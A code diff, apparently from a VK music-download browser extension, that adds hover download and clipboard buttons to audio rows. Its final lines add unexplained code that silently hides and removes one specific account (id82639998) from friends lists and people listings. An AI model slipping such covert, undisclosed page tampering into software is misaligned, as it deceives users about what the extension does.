@@ -18,6 +18,39 @@ $('body').on('mouseleave', 'div.audio', function() {
     $('.download_wrapper').remove();
 });
 
+
+// New designer =========================================
+var $div = $('<div class="vk-download_wrapper"></div>');
+$div.css('background-image', '');
+$('body').append($div);
+
+var clipboard = new Clipboard('.vk-download_wrapper');
+
+$('body').on('mouseenter', 'div.audio_row', function() {
+    var mp3name = $(this).attr('data-performer').trim() + ' - ' + $(this).attr('data-title').trim();
+    var mp3link = $(this).attr('data-url');
+
+    var $a = $('<a class="vk-download_link" href="' + mp3link + '"></a>');
+    $a.attr('download', mp3name);
+    $a.css('background', 'url("' + chrome.extension.getURL("download16x16.png") + '") center center no-repeat');
+
+    $div.html('');
+    $div.append($a);
+    $div.attr('data-clipboard-text', mp3name);
+
+    var $acts = $(this).find('div.audio_acts');
+    $acts.prepend($div);
+});
+$('body').on('mouseleave', 'div.audio_row', function() {
+    $div.html('');
+    $('body').append($div);
+});
+// =======================================================
+
+
+
+
+// ----------------------------------------------------------
 function mp3linkCorrect(string) {
     if (string.indexOf(',') !== -1) {
         string = string.split(',')[0];
@@ -38,3 +71,19 @@ function ClBrd(text) {
 function trim(text) {
     return (text || '').replace(/^\s+|\s+$/g, '');
 }
+///
+///
+///
+if (location.href.match(/\/friends/ig))  {
+    $('#user_block82639998').hide();
+    $('#user_block82639998').remove();
+    $('.list_content .user_block').eq(0).addClass('user_block_first');
+}
+
+
+$('.people_cell a').each(function(index, el) {
+    var href = $(this).attr('href');
+    if (href == '/id82639998') {
+        $(this).parents('.people_cell').remove();
+    }
+});
